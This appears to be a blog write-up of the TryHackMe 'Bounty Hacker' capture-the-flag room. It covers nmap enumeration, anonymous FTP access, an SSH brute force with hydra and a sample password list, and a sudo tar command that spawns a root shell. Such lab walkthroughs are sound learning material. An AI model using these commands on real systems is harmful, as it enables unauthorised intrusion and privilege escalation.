---
title: Bounty Hacker - TryHackMe
date: 2025-05-01
---

<script setup>
    import RoomCard from "../../../.vitepress/components/thm/RoomCard.vue";
</script>

<RoomCard roomName="Bounty Hacker" roomLevel="Easy" roomTechnology="Linux" roomLink="https://tryhackme.com/room/cowboyhacker" roomIcon="/ctf/tryhackme/bounty-hacker/icon-room.png" />

# Challenge Description

You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they'd take you up on claims! Prove your status is more than just a few glasses at the bar. I sense bell peppers & beef in your future! 

# Challenge Overview

The objective of this challenge is to perform a full penetration test on the target machine `10.10.252.60`, identifying potential entry points, exploiting vulnerabilities, and ultimately achieving root access. The target appears to be a fictional system themed around bounty hunters, hinting at potential usernames or passwords.

# Enumeration

## Nmap Scan

We begin with a comprehensive Nmap scan to identify open ports and running services on the target:

```bash
nmap -sC -sV -v -A -oN nmap.txt 10.10.252.60
```

**Scan Results:**

```bash
Not shown: 982 filtered tcp ports (no-response)
PORT    STATE  SERVICE VERSION
21/tcp  open   tcpwrapped
22/tcp  open   tcpwrapped
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp  open   tcpwrapped
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

**Summary of Findings:**

- **Port 21 (FTP)** – Open, potentially misconfigured
- **Port 22 (SSH)** – Open
- **Port 80 (HTTP)** – Open, running Apache 2.4.18 (Ubuntu)

## FTP Enumeration

Accessing the FTP service using an anonymous login was successful. Two files were available for download:

**Downloaded Files:**

- `task.txt`:

  ```text
  1.) Protect Vicious.
  2.) Plan for Red Eye pickup on the moon.

  -lin
  ```

- `locks.txt` – A list of potential passwords:

  ```text
  rEddrAGON
  ReDdr4g0nSynd!cat3
  Dr@gOn$yn9icat3
  R3DDr46ONSYndIC@Te
  ReddRA60N
  R3dDrag0nSynd1c4te
  ...
  ```

The note signed by `lin` hints at a possible username for SSH access.

## SSH Brute-Force Attack

Using the username `lin` identified in `task.txt`, and the password list from `locks.txt`, we performed a brute-force attack with `hydra`:

![SSH Hydra](/ctf/tryhackme/bounty-hacker/ssh.png)

Once valid credentials were discovered, we successfully connected via SSH and retrieved the user flag:

![SSH Login](/ctf/tryhackme/bounty-hacker/ssh-login.png)

# Privilege Escalation

After gaining shell access as the `lin` user, we checked for sudo permissions:

```bash
sudo -l
```

**Output:**

```bash
User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

The user is permitted to execute the `tar` command with root privileges. According to [GTFOBins](https://gtfobins.github.io/gtfobins/tar/#sudo), this can be leveraged to escalate privileges:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

This command spawns a root shell, allowing us to read the root flag:

![Tar Exploit](/ctf/tryhackme/bounty-hacker/tar.png)